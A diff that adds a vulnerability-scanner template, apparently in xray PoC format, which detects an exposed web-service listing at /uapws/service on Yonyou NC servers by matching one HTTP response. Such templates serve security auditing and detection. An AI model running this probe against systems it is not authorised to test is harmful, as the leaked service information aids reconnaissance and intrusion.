@@ -1,0 +1,20 @@
+name: poc-yaml-yonyou-nc-service-info-leak
+manual: true
+transport: http
+set:
+    rand: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /uapws/service
+        expression: response.status == 200 && response.body.bstartsWith(b"<html><head><meta http-equiv=\"content-type\" content=\"text/html;") && "{http://.*?}IMetaWebService4BqCloudPort".bmatches(response.body)
+expression: r0()
+detail:
+    author: z92g(https://github.com/z92g)
+    links:
+        - https://www.linuxlz.com/aqld/3060.html
+    vulnerability:
+        id: CT-515826
+        level: high
